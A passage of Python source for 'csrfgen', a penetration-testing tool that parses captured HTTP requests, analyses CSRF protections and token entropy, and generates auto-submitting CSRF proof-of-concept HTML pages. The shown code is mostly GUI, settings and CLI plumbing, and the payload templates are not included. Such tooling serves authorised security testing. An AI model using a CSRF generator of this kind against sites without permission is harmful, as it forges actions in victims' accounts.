                self.data = json.loads(path.read_text(encoding="utf-8"))
            except Exception as exc:  # noqa: BLE001
                logger.warning("Could not load project %s: %s", path, exc)

    def add_request(self, raw_request: str, label: str = "") -> None:
        self.data.setdefault("requests", []).append({
            "id": str(uuid.uuid4()),
            "label": label or f"request-{len(self.data.get('requests', [])) + 1}",
            "raw": raw_request,
            "added": datetime.now().isoformat(timespec="seconds"),
        })

    def add_history(self, entry: HistoryEntry, limit: int = 50) -> None:
        history = self.data.setdefault("history", [])
        history.append(dataclasses.asdict(entry))
        if len(history) > limit:
            del history[:-limit]

    def save(self) -> None:
        self.path.write_text(json.dumps(self.data, indent=2), encoding="utf-8")
        logger.info("Project saved to %s", self.path)


# --------------------------------------------------------------------------
# Persistent user settings (theme, last PoC options, last edited params)
# --------------------------------------------------------------------------

DEFAULT_SETTINGS_PATH = Path.home() / ".csrfgen" / "settings.json"


class SettingsStore:
    """Persists small pieces of GUI state across runs -- the same way the
    theme is already carried through ``config['theme_name']`` for a single
    session, but written to disk so it survives closing the app.

    Stored on disk:
      - theme_name            : last selected theme
      - last_poc_type         : last PoC type selected in the combobox
      - auto_submit           : last state of the "Auto-submit" checkbox
      - last_params_by_path   : dict[str, dict[str,str]] -- last edited
                                 parameter set, keyed by request path, so
                                 re-parsing the same endpoint restores the
                                 previously edited/injected values instead
                                 of the raw values from the pasted request.
      - last_request          : the last raw request pasted into the
                                 analyzer, so the tool reopens where you
                                 left off.
    """

    def __init__(self, path: Optional[Path] = None) -> None:
        self.path = path or DEFAULT_SETTINGS_PATH
        self.data: dict[str, Any] = {
            "theme_name": "Dark+ (VSCode)",
            "last_poc_type": PoCType.AUTO_FORM.value,
            "auto_submit": True,
            "last_params_by_path": {},
            "last_request": "",
        }
        self._load()

    def _load(self) -> None:
        if self.path.exists():
            try:
                on_disk = json.loads(self.path.read_text(encoding="utf-8"))
                if isinstance(on_disk, dict):
                    self.data.update(on_disk)
                logger.info("Loaded saved settings from %s", self.path)
            except Exception as exc:  # noqa: BLE001
                logger.warning("Could not load settings %s: %s", self.path, exc)

    def save(self) -> None:
        try:
            self.path.parent.mkdir(parents=True, exist_ok=True)
            self.path.write_text(json.dumps(self.data, indent=2), encoding="utf-8")
            logger.info("Settings saved to %s", self.path)
        except Exception as exc:  # noqa: BLE001
            logger.warning("Could not save settings %s: %s", self.path, exc)

    # -- convenience accessors ---------------------------------------------

    def get_params_for(self, path: str) -> Optional[dict[str, str]]:
        return self.data.get("last_params_by_path", {}).get(path)

    def set_params_for(self, path: str, params: dict[str, str]) -> None:
        self.data.setdefault("last_params_by_path", {})[path] = dict(params)
        self.save()

    def set_theme(self, theme_name: str) -> None:
        self.data["theme_name"] = theme_name
        self.save()

    def set_poc_options(self, poc_type: str, auto_submit: bool) -> None:
        self.data["last_poc_type"] = poc_type
        self.data["auto_submit"] = auto_submit
        self.save()

    def set_last_request(self, raw_request: str) -> None:
        self.data["last_request"] = raw_request
        self.save()


# --------------------------------------------------------------------------
# GUI themes (VSCode-inspired color palettes)
# --------------------------------------------------------------------------

THEMES: dict[str, dict[str, str]] = {
    "Dark+ (VSCode)": {
        "bg": "#1e1e1e", "bg_alt": "#252526", "fg": "#d4d4d4", "accent": "#007acc",
    },
    "Light+ (VSCode)": {
        "bg": "#ffffff", "bg_alt": "#f3f3f3", "fg": "#1e1e1e", "accent": "#005fb8",
    },
    "Monokai": {
        "bg": "#272822", "bg_alt": "#2d2e27", "fg": "#f8f8f2", "accent": "#a6e22e",
    },
    "Dracula": {
        "bg": "#282a36", "bg_alt": "#44475a", "fg": "#f8f8f2", "accent": "#bd93f9",
    },
    "One Dark Pro": {
        "bg": "#282c34", "bg_alt": "#21252b", "fg": "#abb2bf", "accent": "#61afef",
    },
    "Solarized Dark": {
        "bg": "#002b36", "bg_alt": "#073642", "fg": "#839496", "accent": "#268bd2",
    },
    "Solarized Light": {
        "bg": "#fdf6e3", "bg_alt": "#eee8d5", "fg": "#657b83", "accent": "#268bd2",
    },
    "Night Owl": {
        "bg": "#011627", "bg_alt": "#0b2942", "fg": "#d6deeb", "accent": "#82aaff",
    },
    "GitHub Dark": {
        "bg": "#0d1117", "bg_alt": "#161b22", "fg": "#c9d1d9", "accent": "#58a6ff",
    },
    "Matrix": {
        "bg": "#0a0e0a", "bg_alt": "#0f1a0f", "fg": "#00ff41", "accent": "#00cc33",
    },
}


# --------------------------------------------------------------------------
# GUI (Tkinter, dark theme, tabbed)
# --------------------------------------------------------------------------

def launch_gui(config: dict[str, Any]) -> None:
    """Launch the Tkinter GUI. Imported lazily so the CLI/API modes do not
    require a display server."""
    import tkinter as tk
    from tkinter import ttk, scrolledtext, filedialog, messagebox

    FONT = ("Segoe UI", 10)
    MONO = ("Consolas", 10)

    class CSRFApp:
        def __init__(self) -> None:
            self.parser = HTTPRequestParser()
            self.analyzer = CSRFAnalyzer(config)
            self.token_analyzer = TokenAnalyzer(config)
            self.categorizer = EndpointCategorizer()
            self.current_request: Optional[ParsedRequest] = None
            self.current_finding: Optional[CSRFFinding] = None
            self.current_poc: str = ""
            self.history: list[HistoryEntry] = []

            # -- persisted settings (theme, last PoC options, last edited
            #    parameters per endpoint, last pasted request) --
            self.settings = SettingsStore()

            # -- theme setup --
            self.font = FONT
            self.mono = MONO
            requested_theme = self.settings.data.get("theme_name") or config.get("theme_name", "Dark+ (VSCode)")
            if requested_theme not in THEMES:
                logger.warning("Unknown theme '%s', falling back to Dark+ (VSCode)", requested_theme)
                requested_theme = "Dark+ (VSCode)"
            self.theme_name = requested_theme
            self.c = dict(THEMES[self.theme_name])
            # widgets that need manual re-coloring when the theme changes,
            # since plain tk widgets (unlike ttk) don't follow ttk styles
            self.themed_text_widgets: list[Any] = []
            self.themed_entry_widgets: list[Any] = []
            self.themed_listbox_widgets: list[Any] = []
            self.themed_frame_widgets: list[Any] = []
            self.themed_check_widgets: list[Any] = []

            self.root = tk.Tk()
            self.root.title(f"{config['app_name']} v{config['version']}")
            self.root.geometry("1150x800")
            self.root.configure(bg=self.c["bg"])

            self._configure_style()
            self._build_menu()
            self._build_layout()

        # -- style / layout ---------------------------------------------------

        def _configure_style(self) -> None:
            style = ttk.Style(self.root)
            try:
                style.theme_use("clam")
            except tk.TclError:
                pass
            style.configure(".", background=self.c["bg"], foreground=self.c["fg"], font=self.font)
            style.configure("TNotebook", background=self.c["bg"], borderwidth=0)
            style.configure("TNotebook.Tab", background=self.c["bg_alt"], foreground=self.c["fg"],
                             padding=(16, 8), font=self.font)
            style.map("TNotebook.Tab", background=[("selected", self.c["accent"])],
                      foreground=[("selected", "#111")])
            style.configure("TFrame", background=self.c["bg"])
            style.configure("TLabel", background=self.c["bg"], foreground=self.c["fg"], font=self.font)
            style.configure("TButton", background=self.c["accent"], foreground="#111",
                             font=self.font, padding=6)
            style.map("TButton", background=[("active", "#5f86d6")])
            style.configure("TCombobox", fieldbackground=self.c["bg_alt"], background=self.c["bg_alt"], foreground=self.c["fg"])

        def _build_menu(self) -> None:
            menubar = tk.Menu(self.root)
            file_menu = tk.Menu(menubar, tearoff=0)
            file_menu.add_command(label="Open request file...", command=self.open_request_file)
            file_menu.add_command(label="Save project...", command=self.save_project)
            file_menu.add_separator()
            file_menu.add_command(label="Reset saved settings...", command=self.reset_saved_settings)
            file_menu.add_separator()
            file_menu.add_command(label="Exit", command=self.root.destroy)
            menubar.add_cascade(label="File", menu=file_menu)

            view_menu = tk.Menu(menubar, tearoff=0)
            theme_menu = tk.Menu(view_menu, tearoff=0)
            self.theme_var = tk.StringVar(value=self.theme_name)
            for name in THEMES:
                theme_menu.add_radiobutton(
                    label=name, value=name, variable=self.theme_var,
                    command=lambda n=name: self.apply_theme(n),
                )
            view_menu.add_cascade(label="Theme", menu=theme_menu)
            menubar.add_cascade(label="View", menu=view_menu)

            help_menu = tk.Menu(menubar, tearoff=0)
            help_menu.add_command(label="About", command=self.show_about_dialog)
            menubar.add_cascade(label="Help", menu=help_menu)

            self.root.config(menu=menubar)

        def show_about_dialog(self) -> None:
            import webbrowser

            dialog = tk.Toplevel(self.root)
            dialog.title("About")
            dialog.configure(bg=self.c["bg"])
            dialog.geometry("420x380")
            dialog.resizable(False, False)

            def add_line(text: str, size: int = 10, bold: bool = False, pady=(4, 0)) -> tk.Label:
                lbl = tk.Label(
                    dialog, text=text, bg=self.c["bg"], fg=self.c["fg"],
                    font=("Segoe UI", size, "bold" if bold else "normal"),
                    justify="center", wraplength=380,
                )
                lbl.pack(pady=pady)
                return lbl

            def add_link(text: str, url: str) -> None:
                lbl = tk.Label(
                    dialog, text=text, bg=self.c["bg"], fg=self.c["accent"],
                    font=("Segoe UI", 10, "underline"), cursor="hand2",
                )
                lbl.pack(pady=2)
                lbl.bind("<Button-1>", lambda e: webbrowser.open(url))

            add_line(config["app_name"], size=16, bold=True, pady=(16, 2))
            add_line(f"Version {config['version']}", size=9, pady=(0, 12))
            add_line("Created by Moufez Khadhraoui", size=11, bold=True, pady=(0, 12))

            add_line("Contact", size=10, bold=True, pady=(4, 2))
            add_link("khadhraoui.moufez@gmail.com", "mailto:khadhraoui.moufez@gmail.com")
            add_link("Discord server", "https://discord.gg/UkUgdj2DPb")
            add_line("Discord: moufez", size=9, pady=(0, 2))
            add_link("Instagram: mou_fez", "https://instagram.com/mou_fez")

            ttk.Button(dialog, text="Close", command=dialog.destroy).pack(pady=18)

        def apply_theme(self, name: str) -> None:
            """Switch the GUI theme live, restyling every open widget."""
            if name not in THEMES:
                return
            self.theme_name = name
            self.c = dict(THEMES[name])
            config["theme_name"] = name  # persists for this session / project saves
            self.settings.set_theme(name)  # persists to disk across app restarts

            self._configure_style()
            self.root.configure(bg=self.c["bg"])

            for w in self.themed_text_widgets:
                try:
                    w.configure(bg=self.c["bg_alt"], fg=self.c["fg"], insertbackground=self.c["fg"])
                except tk.TclError:
                    pass
            for w in self.themed_entry_widgets:
                try:
                    w.configure(bg=self.c["bg_alt"], fg=self.c["fg"], insertbackground=self.c["fg"])
                except tk.TclError:
                    pass
            for w in self.themed_listbox_widgets:
                try:
                    w.configure(bg=self.c["bg_alt"], fg=self.c["fg"])
                except tk.TclError:
                    pass
            for w in self.themed_check_widgets:
                try:
                    w.configure(bg=self.c["bg"], fg=self.c["fg"], selectcolor=self.c["bg_alt"])
                except tk.TclError:
                    pass
            for w in self.themed_frame_widgets:
                try:
                    w.configure(bg=self.c["bg"])
                except tk.TclError:
                    pass

            if hasattr(self, "request_box"):
                self.request_box.tag_config("search", background=self.c["accent"], foreground="#111")

            logger.info("Theme switched to '%s'", name)

        def _build_layout(self) -> None:
            notebook = ttk.Notebook(self.root)
            notebook.pack(fill="both", expand=True, padx=10, pady=10)

            self.tab_analyzer = ttk.Frame(notebook)
            self.tab_csrf = ttk.Frame(notebook)
            self.tab_poc = ttk.Frame(notebook)
            self.tab_reports = ttk.Frame(notebook)

            notebook.add(self.tab_analyzer, text="Request Analyzer")
            notebook.add(self.tab_csrf, text="CSRF Analysis")
            notebook.add(self.tab_poc, text="Generated PoC")
            notebook.add(self.tab_reports, text="Reports")

            self._build_analyzer_tab()
            self._build_csrf_tab()
            self._build_poc_tab()
            self._build_reports_tab()

            # drag & drop support (best effort - requires tkdnd if available)
            try:
                self.tab_analyzer.drop_target_register("DND_Files")  # type: ignore[attr-defined]
                self.tab_analyzer.dnd_bind("<<Drop>>", self._on_drop)  # type: ignore[attr-defined]
            except Exception:
                pass  # tkdnd not installed; drag & drop silently unavailable

        def _build_analyzer_tab(self) -> None:
            t = self.tab_analyzer
            ttk.Label(t, text="Paste raw HTTP request (from Burp Suite):").pack(anchor="w", pady=(6, 2))
            self.request_box = scrolledtext.ScrolledText(
                t, height=18, bg=self.c["bg_alt"], fg=self.c["fg"], insertbackground=self.c["fg"], font=self.mono, wrap="none"
            )
            self.request_box.pack(fill="both", expand=True, padx=2, pady=2)
            self.themed_text_widgets.append(self.request_box)
            last_request = self.settings.data.get("last_request", "")
            if last_request:
                self.request_box.insert(tk.END, last_request)

            search_frame = ttk.Frame(t)
            search_frame.pack(fill="x", pady=4)
            ttk.Label(search_frame, text="Search:").pack(side="left")
            self.search_var = tk.StringVar()
            search_entry = tk.Entry(search_frame, textvariable=self.search_var, bg=self.c["bg_alt"], fg=self.c["fg"],
                                     insertbackground=self.c["fg"])
            search_entry.pack(side="left", fill="x", expand=True, padx=4)
            self.themed_entry_widgets.append(search_entry)
            ttk.Button(search_frame, text="Find", command=self.search_in_request).pack(side="left")

            btn_frame = ttk.Frame(t)
            btn_frame.pack(fill="x", pady=6)
            ttk.Button(btn_frame, text="Parse Request", command=self.parse_request_action).pack(side="left", padx=4)
            ttk.Button(btn_frame, text="Load from file...", command=self.open_request_file).pack(side="left", padx=4)
            ttk.Button(btn_frame, text="Copy Request", command=lambda: self.copy_text(self.request_box.get("1.0", tk.END))).pack(side="left", padx=4)

            ttk.Label(t, text="Parsed summary:").pack(anchor="w", pady=(6, 2))
            self.summary_box = scrolledtext.ScrolledText(t, height=10, bg=self.c["bg_alt"], fg=self.c["fg"], font=self.mono)
            self.summary_box.pack(fill="both", expand=True, padx=2, pady=2)
            self.themed_text_widgets.append(self.summary_box)

        def _build_csrf_tab(self) -> None:
            t = self.tab_csrf
            self.csrf_box = scrolledtext.ScrolledText(t, bg=self.c["bg_alt"], fg=self.c["fg"], font=self.mono)
            self.csrf_box.pack(fill="both", expand=True, padx=6, pady=6)
            self.themed_text_widgets.append(self.csrf_box)
            btn_frame = ttk.Frame(t)
            btn_frame.pack(fill="x", pady=6)
            ttk.Button(btn_frame, text="Copy Report", command=lambda: self.copy_text(self.csrf_box.get("1.0", tk.END))).pack(side="left", padx=4)
            ttk.Button(btn_frame, text="Token Entropy Analysis", command=self.run_token_analysis).pack(side="left", padx=4)

        def _build_poc_tab(self) -> None:
            t = self.tab_poc
            top = ttk.Frame(t)
            top.pack(fill="x", pady=4)
            ttk.Label(top, text="PoC Type:").pack(side="left", padx=(0, 4))
            saved_poc_type = self.settings.data.get("last_poc_type", PoCType.AUTO_FORM.value)
            if saved_poc_type not in [p.value for p in PoCType]:
                saved_poc_type = PoCType.AUTO_FORM.value
            self.poc_type_var = tk.StringVar(value=saved_poc_type)
            combo = ttk.Combobox(top, textvariable=self.poc_type_var, state="readonly",
                                  values=[p.value for p in PoCType])
            combo.pack(side="left", padx=4)
            self.auto_submit_var = tk.BooleanVar(value=bool(self.settings.data.get("auto_submit", True)))
            auto_submit_check = tk.Checkbutton(top, text="Auto-submit", variable=self.auto_submit_var,
                            bg=self.c["bg"], fg=self.c["fg"], selectcolor=self.c["bg_alt"])
            auto_submit_check.pack(side="left", padx=8)
            self.themed_check_widgets.append(auto_submit_check)
            ttk.Button(top, text="Generate PoC", command=self.generate_poc_action).pack(side="left", padx=8)
            ttk.Button(top, text="Edit Parameters...", command=self.edit_params_dialog).pack(side="left", padx=4)

            self.poc_box = scrolledtext.ScrolledText(t, bg=self.c["bg_alt"], fg=self.c["fg"], font=self.mono)
            self.poc_box.pack(fill="both", expand=True, padx=6, pady=6)
            self.themed_text_widgets.append(self.poc_box)

            btn_frame = ttk.Frame(t)
            btn_frame.pack(fill="x", pady=6)
            ttk.Button(btn_frame, text="Copy PoC", command=lambda: self.copy_text(self.poc_box.get("1.0", tk.END))).pack(side="left", padx=4)
            ttk.Button(btn_frame, text="Save PoC as HTML...", command=self.save_poc_html).pack(side="left", padx=4)

            ttk.Label(t, text="History:").pack(anchor="w", pady=(6, 2))
            self.history_list = tk.Listbox(t, bg=self.c["bg_alt"], fg=self.c["fg"], height=6, font=self.mono)
            self.history_list.pack(fill="x", padx=2, pady=2)
            self.history_list.bind("<<ListboxSelect>>", self.load_from_history)
            self.themed_listbox_widgets.append(self.history_list)

        def _build_reports_tab(self) -> None:
            t = self.tab_reports
            top = ttk.Frame(t)
            top.pack(fill="x", pady=4)
            ttk.Button(top, text="Generate Report", command=self.generate_report_action).pack(side="left", padx=4)
            ttk.Button(top, text="Export HTML...", command=lambda: self.export_report("html")).pack(side="left", padx=4)
            ttk.Button(top, text="Export Markdown...", command=lambda: self.export_report("md")).pack(side="left", padx=4)

            self.report_box = scrolledtext.ScrolledText(t, bg=self.c["bg_alt"], fg=self.c["fg"], font=self.mono)
            self.report_box.pack(fill="both", expand=True, padx=6, pady=6)
            self.themed_text_widgets.append(self.report_box)
            self._last_report_md = ""
            self._last_report_html = ""

        # -- actions ---------------------------------------------------------

        def open_request_file(self) -> None:
            path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            if not path:
                return
            try:
                content = Path(path).read_text(encoding="utf-8", errors="replace")
                self.request_box.delete("1.0", tk.END)
                self.request_box.insert(tk.END, content)
            except Exception as exc:  # noqa: BLE001
                messagebox.showerror("Error", f"Could not read file: {exc}")

        def _on_drop(self, event) -> None:  # pragma: no cover - requires tkdnd
            try:
                path = event.data.strip("{}")
                content = Path(path).read_text(encoding="utf-8", errors="replace")
                self.request_box.delete("1.0", tk.END)
                self.request_box.insert(tk.END, content)
            except Exception as exc:  # noqa: BLE001
                messagebox.showerror("Error", f"Could not read dropped file: {exc}")

        def search_in_request(self) -> None:
            term = self.search_var.get()
            self.request_box.tag_remove("search", "1.0", tk.END)
            if not term:
                return
            start = "1.0"
            while True:
                pos = self.request_box.search(term, start, stopindex=tk.END, nocase=True)
                if not pos:
                    break
                end = f"{pos}+{len(term)}c"
                self.request_box.tag_add("search", pos, end)
                start = end
            self.request_box.tag_config("search", background=self.c["accent"], foreground="#111")

        def parse_request_action(self) -> None:
            raw = self.request_box.get("1.0", tk.END)
            try:
                req = self.parser.parse(raw)
                self.current_request = req
                self.settings.set_last_request(raw)

                # restore previously saved/edited parameters for this same
                # endpoint (path), if any were saved on a prior run
                saved_params = self.settings.get_params_for(req.path)
                if saved_params:
                    merged = dict(req.all_params)
                    merged.update(saved_params)
                    self._pending_edited_params = merged
                else:
                    self._pending_edited_params = None

                self.summary_box.delete("1.0", tk.END)
                summary = self._format_summary(req)
                self.summary_box.insert(tk.END, summary)
                logger.info("Parsed request: %s %s", req.method, req.url)
                self.run_csrf_analysis()
            except CSRFGenError as exc:
                messagebox.showerror("Parse Error", str(exc))
            except Exception as exc:  # noqa: BLE001
                logger.exception("Unexpected parse error")
                messagebox.showerror("Unexpected Error", str(exc))

        def _format_summary(self, req: ParsedRequest) -> str:
            category = self.categorizer.categorize(req)
            lines = [
                f"Method:        {req.method}",
                f"URL:           {req.url}",
                f"Body type:     {req.body_type.value}",
                f"Category:      {category}",
                f"Query params:  {req.query_params}",
                f"Body params:   {req.body_params}",
                f"Cookies:       {req.cookies}",
                f"Headers:       {len(req.headers)} header(s)",
            ]
            if req.multipart_fields:
                lines.append(f"Multipart fields: {[f.name for f in req.multipart_fields]}")
            return "\n".join(lines)

        def run_csrf_analysis(self) -> None:
            if not self.current_request:
                messagebox.showwarning("No request", "Parse a request first.")
                return
            finding = self.analyzer.analyze(self.current_request)
            self.current_finding = finding
            self.csrf_box.delete("1.0", tk.END)
            self.csrf_box.insert(tk.END, finding.summary_text())

        def run_token_analysis(self) -> None:
            if not self.current_request:
                messagebox.showwarning("No request", "Parse a request first.")
                return
            results = self.token_analyzer.analyze_request(self.current_request)
            if not results:
                self.csrf_box.insert(tk.END, "\n\nNo candidate token parameters found.\n")
                return
            self.csrf_box.insert(tk.END, "\n\nToken entropy analysis:\n")
            for r in results:
                self.csrf_box.insert(
                    tk.END,
                    f"  - {r.parameter}: len={r.length} entropy={r.entropy_bits_per_char} bits/char -> {r.verdict}\n",
                )

        def edit_params_dialog(self) -> None:
            if not self.current_request:
                messagebox.showwarning("No request", "Parse a request first.")
                return
            dialog = tk.Toplevel(self.root)
            dialog.title("Edit Parameters")
            dialog.configure(bg=self.c["bg"])
            dialog.geometry("500x450")

            params = dict(self.current_request.all_params)
            entries: dict[str, tuple[tk.Entry, tk.Entry]] = {}

            container = tk.Frame(dialog, bg=self.c["bg"])
            container.pack(fill="both", expand=True, padx=8, pady=8)

            def render_rows() -> None:
                for widget in container.winfo_children():
                    widget.destroy()
                entries.clear()
                for i, (k, v) in enumerate(params.items()):
                    key_var = tk.Entry(container, bg=self.c["bg_alt"], fg=self.c["fg"], insertbackground=self.c["fg"])
                    key_var.insert(0, k)
                    key_var.grid(row=i, column=0, sticky="ew", padx=2, pady=2)
                    val_var = tk.Entry(container, bg=self.c["bg_alt"], fg=self.c["fg"], insertbackground=self.c["fg"])
                    val_var.insert(0, v)
                    val_var.grid(row=i, column=1, sticky="ew", padx=2, pady=2)
                    remove_btn = tk.Button(container, text="X", bg="#e74c3c", fg="white",
                                            command=lambda key=k: remove_row(key))
                    remove_btn.grid(row=i, column=2, padx=2)
                    entries[k] = (key_var, val_var)
                container.columnconfigure(0, weight=1)
                container.columnconfigure(1, weight=1)

            def remove_row(key: str) -> None:
                params.pop(key, None)
                render_rows()

            def add_row() -> None:
                new_key = f"param{len(params) + 1}"
                params[new_key] = ""
                render_rows()

            def apply_changes() -> None:
                new_params = {}
                for _, (key_entry, val_entry) in entries.items():
                    k = key_entry.get().strip()
                    v = val_entry.get()
                    if k:
                        new_params[k] = v
                params.clear()
                params.update(new_params)
                self._pending_edited_params = dict(params)
                messagebox.showinfo("Applied", "Parameters updated. Click 'Generate PoC' to apply.")
                dialog.destroy()

            render_rows()
            btns = tk.Frame(dialog, bg=self.c["bg"])
            btns.pack(fill="x", pady=6)
            ttk.Button(btns, text="+ Add Parameter", command=add_row).pack(side="left", padx=4)
            ttk.Button(btns, text="Apply", command=apply_changes).pack(side="right", padx=4)

        def generate_poc_action(self) -> None:
            if not self.current_request:
                messagebox.showwarning("No request", "Parse a request first.")
                return
            params = getattr(self, "_pending_edited_params", None) or self.current_request.all_params
            poc_type = PoCType(self.poc_type_var.get())
            generator = PoCGenerator(self.current_request)
            try:
                poc_html = generator.generate(poc_type, params, self.auto_submit_var.get())
            except CSRFGenError as exc:
                messagebox.showerror("PoC Error", str(exc))
                return
            self.current_poc = poc_html
            self.poc_box.delete("1.0", tk.END)
            self.poc_box.insert(tk.END, poc_html)

            # persist choices to disk so they're restored on the next run
            self.settings.set_poc_options(poc_type.value, self.auto_submit_var.get())
            self.settings.set_params_for(self.current_request.path, params)

            entry = HistoryEntry(
                id=str(uuid.uuid4())[:8],
                timestamp=datetime.now().strftime("%H:%M:%S"),
                poc_type=poc_type.value,
                request_summary=f"{self.current_request.method} {self.current_request.path}",
                poc_html=poc_html,
            )
            self.history.append(entry)
            self.history_list.insert(
                tk.END, f"[{entry.timestamp}] {entry.poc_type} - {entry.request_summary}"
            )

        def load_from_history(self, event=None) -> None:
            sel = self.history_list.curselection()
            if not sel:
                return
            entry = self.history[sel[0]]
            self.poc_box.delete("1.0", tk.END)
            self.poc_box.insert(tk.END, entry.poc_html)

        def generate_report_action(self) -> None:
            if not (self.current_request and self.current_finding and self.current_poc):
                messagebox.showwarning(
                    "Incomplete", "Parse a request, run CSRF analysis, and generate a PoC first."
                )
                return
            gen = ReportGenerator(self.current_request, self.current_finding, self.current_poc, config)
            self._last_report_md = gen.to_markdown()
            self._last_report_html = gen.to_html()
            self.report_box.delete("1.0", tk.END)
            self.report_box.insert(tk.END, self._last_report_md)

        def export_report(self, fmt: str) -> None:
            if not self._last_report_md:
                messagebox.showwarning("No report", "Generate a report first.")
                return
            ext = ".html" if fmt == "html" else ".md"
            path = filedialog.asksaveasfilename(defaultextension=ext,
                                                 filetypes=[(fmt.upper(), f"*{ext}")])
            if not path:
                return
            content = self._last_report_html if fmt == "html" else self._last_report_md
            Path(path).write_text(content, encoding="utf-8")
            messagebox.showinfo("Saved", f"Report saved to {path}")

        def save_poc_html(self) -> None:
            if not self.current_poc:
                messagebox.showwarning("No PoC", "Generate a PoC first.")
                return
            path = filedialog.asksaveasfilename(defaultextension=".html",
                                                 filetypes=[("HTML", "*.html")])
            if path:
                Path(path).write_text(self.current_poc, encoding="utf-8")
                messagebox.showinfo("Saved", f"PoC saved to {path}")

        def reset_saved_settings(self) -> None:
            if not messagebox.askyesno(
                "Reset saved settings",
                "This clears the saved theme, last PoC options, and any "
                "remembered parameter values for every endpoint. Continue?",
            ):
                return
            self.settings.data = {
                "theme_name": "Dark+ (VSCode)",
                "last_poc_type": PoCType.AUTO_FORM.value,
                "auto_submit": True,
                "last_params_by_path": {},
                "last_request": "",
            }
            self.settings.save()
            messagebox.showinfo(
                "Reset", "Saved settings cleared. Restart the app to apply the default theme."
            )

        def save_project(self) -> None:
            path = filedialog.asksaveasfilename(defaultextension=".json",
                                                 filetypes=[("Project", "*.json")])
            if not path:
                return
            store = ProjectStore(Path(path))
            if self.current_request:
                store.add_request(self.current_request.raw_request, label=self.current_request.path)
            for h in self.history:
                store.add_history(h, limit=config["history_limit"])
            store.save()
            messagebox.showinfo("Saved", f"Project saved to {path}")

        def copy_text(self, text: str) -> None:
            self.root.clipboard_clear()
            self.root.clipboard_append(text)

        def run(self) -> None:
            self.root.mainloop()

    app = CSRFApp()
    app.run()


# --------------------------------------------------------------------------
# CLI / API mode
# --------------------------------------------------------------------------

def read_request_source(path_or_dash: str) -> str:
    if path_or_dash == "-":
        return sys.stdin.read()
    return Path(path_or_dash).read_text(encoding="utf-8", errors="replace")


def cmd_analyze(args: argparse.Namespace, config: dict[str, Any]) -> int:
    raw = read_request_source(args.request_file)
    parser = HTTPRequestParser()
    req = parser.parse(raw)
    analyzer = CSRFAnalyzer(config)
    finding = analyzer.analyze(req)
    print(finding.summary_text())

    if args.tokens:
        token_analyzer = TokenAnalyzer(config)
        results = token_analyzer.analyze_request(req)
        if results:
            print("\nToken entropy analysis:")
            for r in results:
                print(f"  - {r.parameter}: len={r.length} entropy={r.entropy_bits_per_char} -> {r.verdict}")
    return 0


def cmd_generate(args: argparse.Namespace, config: dict[str, Any]) -> int:
    raw = read_request_source(args.request_file)
    parser = HTTPRequestParser()
    req = parser.parse(raw)
    generator = PoCGenerator(req)
    poc_type = PoCType(args.generate)
    poc_html = generator.generate(poc_type, auto_submit=not args.no_auto_submit)
    if args.output:
        Path(args.output).write_text(poc_html, encoding="utf-8")
        print(f"PoC written to {args.output}")
    else:
        print(poc_html)
    return 0


def cmd_report(args: argparse.Namespace, config: dict[str, Any]) -> int:
    raw = read_request_source(args.request_file)
    parser = HTTPRequestParser()
    req = parser.parse(raw)
    analyzer = CSRFAnalyzer(config)
    finding = analyzer.analyze(req)
    generator = PoCGenerator(req)
    poc_html = generator.generate(PoCType.AUTO_FORM)
    report = ReportGenerator(req, finding, poc_html, config)

    if args.report == "pdf":
        logger.warning("PDF export requires an external renderer (e.g. weasyprint) "
                        "which is not bundled; falling back to HTML output. "
                        "Install weasyprint and convert the HTML output if a PDF is required.")
        content = report.to_html()
        ext = ".html"
    elif args.report == "markdown" or args.report == "md":
        content = report.to_markdown()
        ext = ".md"
    else:
        content = report.to_html()
        ext = ".html"

    out = args.output or f"csrf_report{ext}"
    Path(out).write_text(content, encoding="utf-8")
    print(f"Report written to {out}")
    return 0


def cmd_diff(args: argparse.Namespace, config: dict[str, Any]) -> int:
    parser = HTTPRequestParser()
    req_a = parser.parse(read_request_source(args.request_a))
    req_b = parser.parse(read_request_source(args.request_b))
    differ = RequestDiffer()
    result = differ.diff(req_a, req_b)
    print(json.dumps(result, indent=2))
    return 0


SUBCOMMANDS = {"analyze", "generate", "report", "diff"}


def build_subcommand_parser() -> argparse.ArgumentParser:
    """Parser used when the first positional argument is an explicit
    subcommand (analyze / generate / report / diff)."""
    p = argparse.ArgumentParser(
        prog="csrfgen",
        description="Professional CSRF PoC Generator & Analyzer (authorized testing only).",
    )
    p.add_argument("--config", help="Path to a JSON configuration file")
    p.add_argument("-v", "--verbose", action="store_true", help="Verbose logging")
    p.add_argument("--gui", action="store_true", help="Launch the graphical interface")

    sub = p.add_subparsers(dest="command", required=True)

    analyze_p = sub.add_parser("analyze", help="Run CSRF analysis on a request")
    analyze_p.add_argument("request_file", help="Path to raw request file, or '-' for stdin")
    analyze_p.add_argument("--tokens", action="store_true", help="Also run token entropy analysis")

    generate_p = sub.add_parser("generate", help="Generate a CSRF PoC")
    generate_p.add_argument("request_file", help="Path to raw request file, or '-' for stdin")
    generate_p.add_argument("--generate", required=True, choices=[t.value for t in PoCType],
                             help="Type of PoC to generate")
    generate_p.add_argument("--no-auto-submit", action="store_true", help="Disable auto-submit script")
    generate_p.add_argument("-o", "--output", help="Output file path")

    report_p = sub.add_parser("report", help="Generate a full security report")
    report_p.add_argument("request_file", help="Path to raw request file, or '-' for stdin")
    report_p.add_argument("--report", required=True, choices=["html", "markdown", "md", "pdf"])
    report_p.add_argument("-o", "--output", help="Output file path")

    diff_p = sub.add_parser("diff", help="Compare two requests for security-relevant differences")
    diff_p.add_argument("request_a")
    diff_p.add_argument("request_b")

    return p


def build_flat_parser() -> argparse.ArgumentParser:
    """Parser used for the spec-compatible flat CLI style:
        csrfgen request.txt --analyze
        csrfgen request.txt --generate html
        csrfgen request.txt --report pdf
    """
    p = argparse.ArgumentParser(
        prog="csrfgen",
        description="Professional CSRF PoC Generator & Analyzer (authorized testing only).",
    )
    p.add_argument("--config", help="Path to a JSON configuration file")
    p.add_argument("-v", "--verbose", action="store_true", help="Verbose logging")
    p.add_argument("--gui", action="store_true", help="Launch the graphical interface")
    p.add_argument("request_file", nargs="?", help="Path to raw request file, or '-' for stdin")
    p.add_argument("--analyze", action="store_true", help="Run CSRF analysis")
    p.add_argument("--generate", choices=[t.value for t in PoCType], help="Generate a PoC of this type")
    p.add_argument("--report", choices=["html", "markdown", "md", "pdf"], help="Generate a report")
    p.add_argument("--tokens", action="store_true", help="Also run token entropy analysis")
    p.add_argument("--no-auto-submit", action="store_true", help="Disable auto-submit script")
